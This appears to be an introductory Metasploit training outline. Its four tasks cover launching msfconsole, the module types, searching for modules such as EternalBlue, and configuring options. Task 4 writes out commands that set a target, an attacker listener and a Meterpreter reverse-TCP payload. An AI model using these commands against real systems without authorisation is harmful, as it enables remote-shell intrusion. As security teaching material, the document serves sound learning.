# Metasploit: Introduction — Tasks

## Task 1: Starting msfconsole
- **Purpose:** Launch the Metasploit console and understand its interface.
- **Skills:** Console startup, basic command navigation.
- **Commands:** `msfconsole`, `msfconsole -q`
- **Theory:** msfconsole is the primary interface to Metasploit. It provides a command-line environment with tab completion, history, and context-sensitive help. The `-q` flag suppresses the banner. Key commands include help, use, show, set, and run.

## Task 2: Module Types
- **Purpose:** Understand the six Metasploit module types and their purposes.
- **Skills:** Module classification, use-case matching.
- **Commands:** `show exploits`, `show payloads`, `show auxiliary`, `show post`, `show encoders`, `show nops`
- **Theory:** Exploit modules deliver attack code. Payload modules define what happens after exploitation (e.g., reverse shell). Auxiliary modules perform scanning and enumeration. Post modules run on compromised hosts. Encoders modify payloads to evade detection. Nop modules generate no-operation instructions.

## Task 3: Searching for Modules
- **Purpose:** Find appropriate modules using Metasploit's search functionality.
- **Skills:** Keyword search, CVE search, rank-based filtering.
- **Commands:** `search eternalblue`, `search cve:2024`, `search type:exploit platform:windows`, `search rank:excellent`
- **Theory:** The search command supports filtering by CVE ID, type, platform, rank, and name. Ranks indicate reliability: excellent, great, good, normal, average, low, manual. Use multiple search terms to narrow results.

## Task 4: Module Configuration
- **Purpose:** Select a module and configure its options.
- **Skills:** Module selection, option display, variable setting.
- **Commands:** `use exploit/multi/handler`, `show options`, `show targets`, `show advanced`, `set RHOSTS 192.168.1.1`, `set LHOST 10.0.0.1`, `set LPORT 4444`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
- **Theory:** After selecting a module with `use`, required options must be set before running. RHOSTS specifies the target. LHOST and LPORT specify the attacker's listener. Use `setg` to set global variables that persist across module changes.
